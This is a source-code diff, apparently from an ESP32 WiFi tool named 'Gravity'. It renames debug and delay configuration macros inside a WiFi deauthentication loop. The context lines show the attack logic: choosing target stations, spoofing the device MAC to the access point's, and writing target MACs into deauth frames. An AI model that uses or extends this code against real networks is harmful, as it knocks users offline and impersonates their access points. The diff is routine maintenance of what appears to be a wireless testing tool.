@@ -27,7 +27,7 @@ char *DEAUTH_TAG = "deauth@GRAVITY";
 
 static DeauthMode mode = DEAUTH_MODE_OFF;
 static DeauthMAC deauthMAC = DEAUTH_MAC_FRAME;
-static long delay = DEAUTH_MILLIS_DEFAULT;
+static long delay = CONFIG_DEFAULT_DEAUTH_MILLIS;
 static TaskHandle_t deauthTask = NULL;
 
 void deauthLoop(void *pvParameter) {
@@ -64,7 +64,7 @@ void deauthLoop(void *pvParameter) {
                 /* Use gravity_selected_sta as targetSTA */
                 targetSTA = gravity_selected_stas;
                 targetCount = gravity_sel_sta_count;
-                #ifdef DEBUG_VERBOSE
+                #ifdef CONFIG_DEBUG_VERBOSE
                     printf("DEAUTH STA mode. targetCount %d", targetCount);
                     for (int z=0; z<targetCount; ++z) {
                         printf(" targetSTA[%d] %02x:%02x:%02x:%02x:%02x:%02x",z,targetSTA[z]->mac[0],targetSTA[z]->mac[1],targetSTA[z]->mac[2],targetSTA[z]->mac[3],targetSTA[z]->mac[4],targetSTA[z]->mac[5]);
@@ -96,7 +96,7 @@ void deauthLoop(void *pvParameter) {
                 case DEAUTH_MAC_SPOOF:
                     if (targetSTA[i]->apMac[0] != 0x00) {
                     /* Set device MAC to targetSTA[i].apMac if it exists */
-                    #ifdef DEBUG_VERBOSE
+                    #ifdef CONFIG_DEBUG_VERBOSE
                         printf("spoofing, i is %d, mode is %d", i, mode);
                         printf(" STA is %s", targetSTA[i]->strMac);
                         printf(" AP is %p", targetSTA[i]->ap);
@@ -111,7 +111,7 @@ void deauthLoop(void *pvParameter) {
                             ESP_LOGW(DEAUTH_TAG, "Setting MAC to %02x:%02x:%02x:%02x:%02x:%02x failed, oh well",targetSTA[i]->apMac[0],targetSTA[i]->apMac[1],targetSTA[i]->apMac[2],targetSTA[i]->apMac[3],targetSTA[i]->apMac[4],targetSTA[i]->apMac[5]);
                         }
                     } else {
-                        #ifdef DEBUG_VERBOSE
+                        #ifdef CONFIG_DEBUG_VERBOSE
                             printf("No AP info, not changing SRC from %02x:%02x:%02x:%02x:%02x:%02x\n",deauth_pkt[DEAUTH_SRC_OFFSET],deauth_pkt[DEAUTH_SRC_OFFSET+1],deauth_pkt[DEAUTH_SRC_OFFSET+2],deauth_pkt[DEAUTH_SRC_OFFSET+3],deauth_pkt[DEAUTH_SRC_OFFSET+4],deauth_pkt[DEAUTH_SRC_OFFSET+5]);
                         #endif
                     }
@@ -120,7 +120,7 @@ void deauthLoop(void *pvParameter) {
                         ESP_LOGE(DEAUTH_TAG, "Invalid MAC action %d", deauthMAC);
             }
             /* Set destination */
-            #ifdef DEBUG_VERBOSE
+            #ifdef CONFIG_DEBUG_VERBOSE
                 printf("Destination %s\n",targetSTA[i]->strMac);
             #endif
             memcpy(&deauth_pkt[DEAUTH_DEST_OFFSET], targetSTA[i]->mac, 6);
